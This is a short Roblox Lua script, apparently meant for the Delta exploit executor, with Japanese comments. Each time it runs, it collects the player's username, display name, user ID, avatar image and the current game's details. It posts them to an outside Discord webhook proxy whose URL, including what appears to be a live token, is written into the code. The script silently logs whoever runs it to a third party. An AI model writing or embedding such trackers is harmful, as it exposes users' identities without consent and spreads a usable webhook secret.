local MarketService = game:GetService("MarketplaceService")
local player = game.Players.LocalPlayer
local info = MarketService:GetProductInfo(game.PlaceId)

local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

local data = {
    ["embeds"] = {{
        ["title"] = "👤 実行ユーザー: " .. player.Name,
        ["description"] = "Deltaスクリプトが実行されました。",
        ["color"] = 5814783, -- 青色
        ["fields"] = {
            {
                ["name"] = "🆔 ユーザー詳細",
                ["value"] = "**表示名:** " .. player.DisplayName .. "\n**ユーザー名:** " .. player.Name .. "\n**ユーザーID:** " .. player.UserId,
                ["inline"] = true
            },
            {
                ["name"] = "🎮 実行場所",
                ["value"] = "**ゲーム名:** " .. info.Name .. "\n**Place ID:** " .. game.PlaceId,
                ["inline"] = true
            }
        },
        ["image"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        },
        ["footer"] = {
            ["text"] = "実行時刻: " .. os.date("%Y/%m/%d %X")
        }
    }}
}

-- 送信
local response = request({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode(data)
})

if response.Success then
    print("送信完了: " .. player.Name .. " としてログを送りました")
else
    print("送信失敗: " .. response.StatusCode)
end
